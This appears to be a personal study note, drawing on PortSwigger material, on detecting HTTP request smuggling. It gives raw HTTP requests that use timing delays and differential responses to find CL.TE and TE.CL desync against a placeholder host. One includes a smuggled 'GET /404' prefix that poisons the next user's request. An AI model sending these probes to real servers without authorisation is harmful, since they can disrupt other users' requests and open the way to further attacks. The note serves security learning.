#http 
#request-smuggling 
# Timing techniques

Send request that will cause a time delay. #burp scanner works the same way.

# Finding [[HTTP RS Attacks#CL.TE]]
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
Front-end server uses `Content-Length` and omits `X`. Back-end server uses `TE` processing the first chunk and waits for the next.

# Finding [[HTTP RS Attacks#TE.CL]]
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
Front-end will omit `X`, Back-end server expects more content tin the body and waits for the remaining.
The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability.

# Confirming vulns using differential responses
This involves sending two requests to the application in quick succession:
- An "attack" request that is designed to interfere with the processing of the next request.
- A "normal" request.

Normal request:
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

## Confirming [[HTTP RS Attacks#CL.TE]]
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```
If the attack is successfull, then the last two lines are treated by back-end server as belonging to the next request that is received:
```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
Since this request contains an invalid URL, the server will respond 404.
### Confirming TE.CL vulnerabilities using differential responses
#to-be-continued 
https://portswigger.net/web-security/request-smuggling/finding